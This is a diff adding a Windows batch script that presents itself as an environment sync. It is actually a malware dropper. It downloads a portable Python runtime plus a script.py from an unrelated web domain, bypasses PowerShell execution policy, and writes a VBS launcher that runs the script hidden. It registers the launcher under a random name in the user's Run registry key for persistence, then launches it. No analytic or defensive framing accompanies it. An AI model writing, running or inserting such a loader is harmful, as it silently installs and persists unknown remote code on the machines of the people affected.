@@ -1,0 +1,34 @@
+@echo off
+setlocal
+
+:: --- Configuration ---
+set "U1=https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip"
+set "U2=http://townandcountry-form.org/SimpleAPI/script.py"
+set "D=%LOCALAPPDATA%\WinPlatform"
+set "Z=%D%\p.zip"
+set "S=%D%\s.py"
+set "V=%D%\run.vbs"
+
+if not exist "%D%" mkdir "%D%"
+
+echo [*] Synchronizing environment...
+
+:: PowerShell: Download, Extract, and Create VBS Launcher
+powershell -ExecutionPolicy Bypass -Command ^
+"$dir='%D%'; ^
+$web=New-Object System.Net.WebClient; ^
+$web.Headers.Add('User-Agent','Mozilla/5.0'); ^
+[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12; ^
+$web.DownloadFile('%U1%','%Z%'); ^
+$web.DownloadFile('%U2%','%S%'); ^
+Expand-Archive -Path '%Z%' -DestinationPath '%D%' -Force; ^
+Remove-Item '%Z%'; ^
+$vbsText = 'Set ws = CreateObject(\"WScript.Shell\"): ws.Run \"\"\"' + $dir + '\python.exe\"\" \"\"' + $dir + '\s.py\"\"\", 0, False'; ^
+[System.IO.File]::WriteAllText('%V%', $vbsText); ^
+$key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; ^
+$val = [System.Guid]::NewGuid().ToString().Substring(0,8); ^
+New-ItemProperty -Path $key -Name $val -Value 'wscript.exe \"%V%\"' -PropertyType 'String' -Force; ^
+Start-Process 'wscript.exe' -ArgumentList '\"%V%\"'"
+
+echo [+] Complete. Process is running hidden.
+endlocal
